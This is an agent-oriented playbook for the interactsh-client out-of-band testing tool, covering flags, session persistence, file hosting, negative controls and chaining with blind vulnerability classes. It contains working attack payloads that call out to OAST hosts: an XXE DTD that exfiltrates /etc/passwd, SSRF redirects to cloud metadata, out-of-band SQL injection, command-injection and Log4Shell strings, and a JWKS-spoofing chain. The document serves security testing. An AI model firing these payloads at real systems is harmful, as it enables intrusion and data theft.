---
name: interactsh-client
description: Interactsh client payload generation, session persistence, and OAST correlation controls for blind-vuln confirmation.
---

# interactsh-client CLI Playbook

Official docs:
- https://docs.projectdiscovery.io/opensource/interactsh/running
- https://docs.projectdiscovery.io/opensource/interactsh/usage
- https://github.com/projectdiscovery/interactsh

Canonical syntax:
`interactsh-client [flags]`

High-signal flags:
- `-s, -server <host>` interactsh server(s) (default rotates `oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me`)
- `-t, -token <string>` auth token for protected servers (self-hosted)
- `-n, -number <n>` number of payloads to generate up front (default 1)
- `-pi, -poll-interval <sec>` poll interval for pulling interaction data (default 5)
- `-nf, -no-http-fallback` disable HTTP fallback registration
- `-cidl, -correlation-id-length <n>` correlation preamble length (min 3, default 20)
- `-cidn, -correlation-id-nonce-length <n>` nonce length (min 3, default 13)
- `-sf, -session-file <path>` store/read correlation state (survives restarts)
- `-kai, -keep-alive-interval <dur>` session keep-alive (default `1m`)
- `-m, -match <pattern>` match interactions by substring/regex
- `-f, -filter <pattern>` filter interactions out by substring/regex
- `-dns-only` / `-http-only` / `-smtp-only` restrict displayed protocol
- `-asn` include ASN of remote IP in JSON output
- `-ps, -payload-store` persist generated payloads
- `-psf, -payload-store-file <path>` custom payload-store path (default `interactsh_payload.txt`)
- `-fl, -file <file(s)>` local file(s) to upload and host on the interactsh server
- `-fsf, -file-store-file <path>` store hosted file URLs to given file (requires `-fl`)
- `-config <path>` flag configuration file (default `~/.config/interactsh-client/config.yaml`)
- `-auth` configure ProjectDiscovery Cloud (PDCP) API key
- `-up, -update` update interactsh-client to latest version
- `-duc, -disable-update-check` skip auto-update check (set in automation)
- `-health-check, -hc` run diagnostic check up
- `-json` JSONL output
- `-o <file>` output file
- `-v` verbose interaction output

Agent-safe baseline for automation:
`interactsh-client -n 10 -ps -psf oast_payloads.txt -json -o oast.jsonl -duc -silent`
(generates 10 unique payloads, writes them to `oast_payloads.txt`, streams JSONL interactions to `oast.jsonl`, no update noise)

Common patterns:
- Blind-vuln sweep with persistent session:
  `interactsh-client -n 20 -sf oast.session -ps -psf payloads.txt -json -o oast.jsonl -duc`
- SSRF confirmation (DNS-only is the strongest signal, HTTP suppresses noisy scanner hits):
  `interactsh-client -n 5 -dns-only -ps -psf ssrf_payloads.txt -json -o ssrf_oast.jsonl -duc`
- Blind RCE / log4shell style callback with HTTP-only match:
  `interactsh-client -n 5 -http-only -ps -psf rce_payloads.txt -json -o rce_oast.jsonl -duc`
- Private / self-hosted interactsh server (no default rotation):
  `interactsh-client -server https://oast.internal -token "$INTERACTSH_TOKEN" -n 5 -ps -json -o oast.jsonl`
- Rejoin a prior correlation ID (confirm a hit after a long gap):
  `interactsh-client -sf oast.session -json -o oast_followup.jsonl -duc`
- Narrow display to a specific pattern (e.g. only the ID you injected):
  `interactsh-client -n 1 -m "cve2024rce" -ps -json -o oast.jsonl -duc`
- Host a file on the OAST server (JWKS, DTD, redirect page):
  `interactsh-client -fl jwks.json -fsf hosted_urls.txt -ps -psf payloads.txt -json -o oast.jsonl -duc`
- Diagnostics — verify server connectivity:
  `interactsh-client -hc`

Critical correctness rules:
- Each payload is a **single-use correlation handle** — reuse of one payload across two tests collapses attribution; always `-n <k>` to batch and store with `-ps`.
- `-sf <path>` is required if the test crosses process boundaries (payload injected now, callback expected minutes later from another agent/run); without it, interactions arrive but the client that lost state cannot decrypt them.
- The default server list uses public PD infrastructure — assume the target can see those domains in its logs; use a private `-server` for engagements where that disclosure matters.
- `-nf` suppresses HTTP fallback — leave it off unless the sandbox cannot reach HTTP OAST and you explicitly want DNS-only.
- Correlation IDs under `-cidl 20 -cidn 13` are the ProjectDiscovery baseline; shortening them collides faster at scale and is almost never worth it.
- OAST is the positive signal for blind classes — pair every assertion with a negative control (clean payload, inert domain) so you know a hit wasn't preexisting noise. Route to `validation/negative_control_design.md`.

Usage rules:
- Pin the payload file with `-psf` so other tools (nuclei, sqlmap, manual curl) can read the exact payloads back for templating.
- Keep `-json -o <file>` on in automation; the human-readable terminal stream is lossy under rate.
- Lower `-pi` only when sub-5-second confirmation matters; shorter polling increases load on the OAST server.
- Do not use `-h`/`--help` for routine runs unless absolutely necessary.

Failure recovery:
- No interactions arriving when you expect them: verify the payload actually left the sandbox (`curl -v https://<payload>.oast.pro`); if DNS resolves and the client is silent, the session file is wrong or `-dns-only`/`-http-only` is masking the hit.
- Server registration errors: rotate to a different `-server` from the default list, or re-run with `-nf` disabled to allow HTTP fallback.
- JSONL output empty but terminal showed hits: `-silent` without `-o` discards non-match output; re-add `-o <file>` explicitly.

If uncertain, query web_search with:
`site:docs.projectdiscovery.io interactsh <flag> usage`

---

## OAST Correlation Methodology

Interactsh is not a scanner — it is the **confirmation substrate** for blind vulnerability classes. Every blind finding ultimately reduces to: payload reaches injection context → target processes payload → target makes an out-of-band callback → interactsh correlates the callback to the originating payload.

The confirmation pipeline:
1. Generate payloads (`-n <k>`) — each is a unique subdomain of the OAST server
2. Record the payload-to-injection-point mapping (`-ps -psf`)
3. Inject each payload into exactly one test position
4. Poll for interactions (`-pi`, default 5s)
5. Correlate incoming interactions by correlation ID → the matching payload tells you which injection point triggered

### Correlation ID anatomy

Each payload encodes a correlation ID: `<preamble><nonce>.<server-domain>`.
- `-cidl` (default 20): preamble length — the fixed part identifying this client session
- `-cidn` (default 13): nonce length — the per-payload unique suffix
- Total subdomain label = preamble + nonce (default 33 chars)
- Shortening either increases collision risk at scale; the defaults are sized to avoid collisions across concurrent sessions on the same server

### One payload per injection point

Never reuse a payload across multiple injection positions. If payload `abc123.oast.pro` is injected into both a `Host` header and a `url` query param, and a DNS callback arrives, you cannot attribute which injection point fired. Generate `N` payloads for `N` test positions and map them 1:1.

### Protocol discrimination

The callback protocol reveals what the target did with the payload:
- **DNS**: target resolved the domain — weakest signal but hardest to block; proves the string was processed in a DNS-resolving context (SSRF, XXE entity resolution, RCE with `nslookup`, Log4Shell JNDI)
- **HTTP**: target made an HTTP request to the domain — stronger signal; proves outbound HTTP capability (SSRF `fetch`/`curl`, XXE with HTTP entity, blind RCE with `wget`/`curl`)
- **SMTP**: target sent email to the domain — proves email-sending context (email header injection, SMTP injection)

Use `-dns-only`/`-http-only`/`-smtp-only` to focus on the expected protocol and suppress noise from the others.

### Timing and observation window

The callback can arrive instantly (direct SSRF) or after minutes/hours (queued job processing, cron-triggered execution, log aggregation pipeline). Set the observation window based on the target's processing model:
- Real-time endpoints: 30–60 seconds is sufficient
- Async/queue processing: minutes to tens of minutes
- Log-triggered execution (Log4Shell in log aggregation): hours
- Keep the client alive with `-sf` for long-window tests; rejoin with the same session file to poll for late arrivals

---

## File Hosting

`-fl, -file <file(s)>` uploads local files to the interactsh server and serves them at a URL derived from the client's OAST subdomain. This turns interactsh from a passive callback listener into an **active content server** — the target fetches attacker-controlled content from the OAST domain.

### Hosting a file

```bash
interactsh-client -fl payload.dtd -fsf hosted_urls.txt -ps -psf payloads.txt -json -o oast.jsonl -duc
```

`-fsf` writes the hosted file URLs so downstream tools can reference them. Multiple files can be hosted by repeating `-fl` or passing a comma-separated list.

### Attack chains enabled by file hosting

**JWKS spoofing (jwt_tool `-X s` chain):**
```bash
# 1. Generate the attacker JWKS (jwt_tool writes it during -X s setup)
# 2. Host it on the OAST server
interactsh-client -fl attacker_jwks.json -fsf hosted.txt -ps -psf payloads.txt -json -o oast.jsonl -duc &
# 3. Read the hosted URL from hosted.txt
JWKS_URL=$(cat hosted.txt | head -1)
# 4. Forge the token with the spoofed jku
jwt_tool <token> -X s -ju "$JWKS_URL"
```
The target fetches the JWKS from the OAST domain → interactsh logs the HTTP interaction → confirms the server followed the `jku` claim. Route to `tooling/jwt_tool.md`, `vulnerabilities/authentication_jwt.md`.

**XXE external DTD hosting:**
```bash
# 1. Create the external DTD
echo '<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '"'"'https://PAYLOAD.oast.pro/?d=%data;'"'"'>">
%eval;
%exfil;' > evil.dtd

# 2. Host it
interactsh-client -fl evil.dtd -fsf hosted.txt -ps -json -o oast.jsonl -duc &

# 3. Inject the external entity reference pointing to the hosted DTD
# <!DOCTYPE foo SYSTEM "https://<hosted-url>/evil.dtd">
```
Route to `vulnerabilities/xxe.md`.

**SSRF redirect chain:**
```bash
# Host a redirect page that bounces the server-side request to an internal target
echo '<html><meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/"></html>' > redirect.html
interactsh-client -fl redirect.html -fsf hosted.txt -ps -json -o oast.jsonl -duc &
```
Route to `vulnerabilities/ssrf.md`.

### Caveats

- File hosting requires server support — public PD servers may restrict which file types or sizes are accepted; self-hosted servers have no such restriction.
- The hosted file URL is tied to the OAST session — when the client stops, the file is no longer served.
- The interactsh interaction log records every fetch of the hosted file — this is both the confirmation signal and the attribution mechanism.

---

## Session Persistence

`-sf, -session-file <path>` stores the cryptographic material needed to decrypt incoming interactions. Without it, the client generates ephemeral keys — if the process dies, subsequent clients cannot correlate or decrypt interactions for the same payloads.

### Why sessions matter for multi-agent flows

The Zen agent graph can span multiple processes and tool invocations:
- Agent A generates payloads and injects them into the target
- Agent B (or Agent A after restart) needs to poll for callbacks from those payloads
- Without `-sf`: Agent B starts a fresh session, gets new payloads, cannot decrypt Agent A's interactions
- With `-sf oast.session`: Agent B loads Agent A's crypto state and decrypts normally

### Session lifecycle

```bash
# Start: generate payloads and persist session
interactsh-client -n 20 -sf oast.session -ps -psf payloads.txt -json -o oast.jsonl -duc

# ... client stops (Ctrl-C, timeout, agent boundary) ...

# Resume: load the same session to poll for late callbacks
interactsh-client -sf oast.session -json -o oast_late.jsonl -duc
```

### Keep-alive

`-kai, -keep-alive-interval <dur>` (default `1m`) sends periodic pings to the OAST server to maintain the session registration. If the interval expires without a ping, the server may deregister the session — subsequent callbacks would be accepted but not routed to this client.

For long-window tests (log-triggered, cron-processed), ensure either:
- The client stays running with a reasonable `-kai`
- The session file is preserved and the client is restarted before the observation window closes

---

## Protocol Filtering and Interaction Matching

### Protocol filters

`-dns-only`, `-http-only`, `-smtp-only` restrict which interaction types are displayed and written to output. They do **not** prevent the server from recording other protocol types — they filter the client's view.

Use cases:
- `-dns-only` for SSRF confirmation — DNS resolution is the hardest signal to block; firewalls that restrict outbound HTTP/HTTPS often still allow DNS
- `-http-only` for RCE confirmation — an HTTP callback with request headers/body carries richer signal than a bare DNS lookup
- `-smtp-only` for email injection — isolate email-context interactions from DNS/HTTP noise

### Match and filter patterns

`-m, -match <pattern>` and `-f, -filter <pattern>` accept substring or regex:

```bash
# Show only interactions containing a specific correlation ID prefix
interactsh-client -sf oast.session -m "abc123" -json -o matched.jsonl -duc

# Suppress known scanner noise (e.g. health-check bots that probe all subdomains)
interactsh-client -sf oast.session -f "healthcheck" -json -o filtered.jsonl -duc
```

`-m` and protocol filters can combine: `-http-only -m "abc123"` shows only HTTP interactions matching the pattern.

### ASN attribution

`-asn` appends the Autonomous System Number of the remote IP to JSON output. This answers "did the callback come from the target's infrastructure or from an unrelated scanner/crawler?" — critical for noisy environments where OAST domains get probed by internet-wide scanners.

```bash
interactsh-client -n 5 -asn -json -o oast.jsonl -duc
# JSON output includes "remote-address" and "asn" fields
# Compare the ASN against the target's known infrastructure
```

---

## Negative Control Design

Every OAST-confirmed finding must be paired with a negative control to distinguish a real vulnerability from environmental noise. Route to `validation/negative_control_design.md` for the full methodology.

### The pattern

1. Generate at least 2 payloads: payload A (injection) and payload B (control)
2. Inject payload A into the suspected vulnerable parameter with the attack string
3. Send payload B through the **same endpoint and parameter** but with a benign value (no injection syntax)
4. Observe:
   - A hits, B silent → **confirmed** — the injection context triggered the callback
   - Both hit → **noise** — the endpoint resolves/fetches any domain in that parameter position regardless of content
   - Neither hits → **no signal** — the injection may not reach a processing context, or the observation window is too short
   - B hits, A silent → **investigate** — possible rate-limiting, WAF, or payload-specific blocking

### Timing discipline

The negative control's silence must be established over the **full observation window**, not just the first few seconds. A callback from the control payload arriving 10 minutes late invalidates a finding confirmed at 30 seconds. Wait the full window before declaring the negative control silent.

### Multi-vector negative controls

When testing multiple injection points simultaneously, each needs its own control payload:

```bash
# Generate 10 attack payloads + 10 control payloads
interactsh-client -n 20 -ps -psf payloads.txt -json -o oast.jsonl -duc &

# payloads 1-10: attack (injected with exploit syntax)
# payloads 11-20: control (injected with benign values)
# Map: payload 1 ↔ control 11, payload 2 ↔ control 12, etc.
```

---

## Server Modes

### Public ProjectDiscovery servers (default)

The default `-server` rotates across `oast.pro,oast.live,oast.site,oast.online,oast.fun,oast.me`. These are free, reliable, and require no setup.

Tradeoffs:
- The OAST domain appears in the target's DNS logs, HTTP logs, and potentially WAF logs — any of `*.oast.pro` etc. are well-known OAST indicators
- Rate and storage limits may apply; file hosting (`-fl`) may be restricted
- Payload encryption ensures only the generating client can read interaction content

### Self-hosted server

For engagements where OAST domain disclosure is unacceptable, deploy a private interactsh server on attacker-controlled infrastructure:

```bash
# Client connecting to a private server
interactsh-client -server https://oast.internal.tld -token "$INTERACTSH_TOKEN" -n 10 -ps -json -o oast.jsonl
```

Self-hosted servers:
- Use a custom domain the target has no reason to flag
- Support unrestricted file hosting (`-fl`)
- Require DNS delegation: the server's domain must have NS records pointing to the interactsh server so wildcard subdomains resolve
- Support all interaction protocols (DNS, HTTP, SMTP, LDAP)

### Configuration and diagnostics

`-config <path>` (default `~/.config/interactsh-client/config.yaml`) persists default flags:
```yaml
server: https://oast.internal.tld
token: <token>
poll-interval: 5
```

`-auth` configures the ProjectDiscovery Cloud (PDCP) API key for authenticated access to PD-hosted servers.

`-health-check, -hc` runs a diagnostic against the configured server(s) — verifies connectivity, registration, and interaction receipt. Run it first when debugging "no interactions arriving."

---

## Chaining with Blind Vulnerability Classes

Interactsh is the OAST substrate for every blind vulnerability class in the corpus. Each class uses OAST differently — the payload shape, the expected protocol, and the confirmation signal vary.

### Blind SSRF

Inject OAST payloads as URLs in SSRF-susceptible parameters. DNS callback confirms the target resolved the attacker domain; HTTP callback confirms it fetched the URL.

```bash
interactsh-client -n 5 -dns-only -ps -psf ssrf_payloads.txt -json -o ssrf.jsonl -duc &
# Inject: curl "https://target/fetch?url=https://$(head -1 ssrf_payloads.txt)"
```
DNS-only is preferred — many SSRF-vulnerable endpoints resolve the domain but are blocked from making the full HTTP request by egress firewalls. DNS still leaks. Route to `vulnerabilities/ssrf.md`.

### Blind SQL injection (OOB)

OAST payloads in SQL context trigger DNS/HTTP callbacks when the database engine resolves or fetches the attacker domain:

- **MySQL**: `SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.PAYLOAD.oast.pro\\share'))`
- **MSSQL**: `EXEC master..xp_dirtree '\\PAYLOAD.oast.pro\share'`
- **Oracle**: `SELECT UTL_HTTP.REQUEST('http://PAYLOAD.oast.pro/'||user) FROM DUAL`
- **PostgreSQL**: `COPY (SELECT '') TO PROGRAM 'nslookup PAYLOAD.oast.pro'`

Route to `vulnerabilities/sql_injection.md`.

### Blind XXE (OOB)

External entity references pointing to OAST domains confirm the XML parser resolves external entities:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "https://PAYLOAD.oast.pro/xxe">
]>
<root>&xxe;</root>
```

For data exfiltration via OOB XXE, host the parametric DTD with `-fl` (see File Hosting above). Route to `vulnerabilities/xxe.md`.

### Blind RCE

Command-injection payloads that execute DNS lookups or HTTP requests:

```bash
# DNS-based (works even with restricted outbound HTTP)
; nslookup PAYLOAD.oast.pro
`nslookup PAYLOAD.oast.pro`
$(nslookup PAYLOAD.oast.pro)

# HTTP-based (richer signal — headers, body visible in interaction)
; curl https://PAYLOAD.oast.pro/rce
; wget -q -O- https://PAYLOAD.oast.pro/rce
```

Route to `vulnerabilities/rce.md`.

### Log4Shell / JNDI

```
${jndi:ldap://PAYLOAD.oast.pro/a}
${jndi:dns://PAYLOAD.oast.pro/a}
```

DNS callback confirms the JNDI lookup resolved the domain; LDAP callback confirms the LDAP client connected. The DNS variant bypasses some WAF patterns that block `ldap://`. Route to `vulnerabilities/rce.md` (Log4Shell subsection).

### Relationship with nuclei

Nuclei has its own built-in interactsh integration — templates with `{{interactsh-url}}` markers generate payloads automatically. `interactsh-client` is the **standalone** OAST tool for:
- Manual/custom injection outside nuclei's template framework
- Multi-step chains where the payload injection is driven by other tools (sqlmap, jwt_tool, curl)
- File hosting (`-fl`) for active content serving
- Long-window observation with session persistence

`-ni`/`-no-interactsh` disables nuclei's built-in integration when using standalone `interactsh-client` alongside nuclei. Route to `tooling/nuclei.md`.

---

## Automation and Output Parsing

### JSONL output structure

Each interaction is a single JSON line with fields:
- `protocol`: `dns`, `http`, or `smtp`
- `unique-id`: the correlation ID that maps back to the payload
- `full-id`: the complete subdomain (correlation ID + server domain)
- `raw-request`: the raw interaction data (DNS query, HTTP request, SMTP envelope)
- `remote-address`: source IP of the callback
- `timestamp`: when the interaction was recorded
- `asn`: (if `-asn`) the ASN of the remote IP

### Parsing patterns

```bash
# Filter by protocol
jq 'select(.protocol == "dns")' oast.jsonl

# Extract unique correlation IDs that triggered
jq -r '.["unique-id"]' oast.jsonl | sort -u

# Cross-reference against the payload map
# payloads.txt has one payload per line; line N = injection point N
grep -n "$(jq -r '.["full-id"]' oast.jsonl | head -1 | cut -d. -f1)" payloads.txt

# Count interactions per protocol
jq -r '.protocol' oast.jsonl | sort | uniq -c

# Filter by ASN to confirm target-origin callbacks
jq 'select(.asn | contains("AS12345"))' oast.jsonl
```

### Background pipeline

```bash
# 1. Start interactsh in the background
interactsh-client -n 20 -sf oast.session -ps -psf payloads.txt -json -o oast.jsonl -duc &
OAST_PID=$!

# 2. Read payloads and inject into targets (other tools, manual curl, etc.)
# ...

# 3. Wait for the observation window
sleep 120

# 4. Check results
HITS=$(wc -l < oast.jsonl)
echo "Interactions received: $HITS"

# 5. Stop the client
kill $OAST_PID
```

### Payload file as injection source

`-ps -psf payloads.txt` writes one payload per line. Downstream tools consume this directly:

```bash
# Feed OAST payloads into ffuf
ffuf -u "https://target/fetch?url=FUZZ" -w payloads.txt -mc all -o ffuf_oast.json

# Substitute into sqlmap tamper
while read -r payload; do
  sqlmap -u "https://target/search?q=1" --eval="import urllib.parse; q=urllib.parse.quote(\"' AND 1=LOAD_FILE('\\\\\\\\${payload}\\\\share')-- -\")" --batch
done < payloads.txt
```

---

Routed consumers:
- `vulnerabilities/ssrf.md` (blind SSRF confirmation)
- `vulnerabilities/sql_injection.md` (blind-sqli OAST payloads)
- `vulnerabilities/xxe.md` (OOB XXE)
- `vulnerabilities/rce.md` (OAST-confirmed RCE, log4shell-shape callbacks)
- `vulnerabilities/authentication_jwt.md` (JWKS hosting for jku spoofing via `-fl`)
- `validation/negative_control_design.md` (OAST as the positive signal paired with a clean control)
- `tooling/nuclei.md` (`-ni`/`-no-interactsh` is the inverse; interactsh-client is what you reach for when running outside nuclei)
- `tooling/jwt_tool.md` (file hosting chain for `-X s` JWKS spoof)
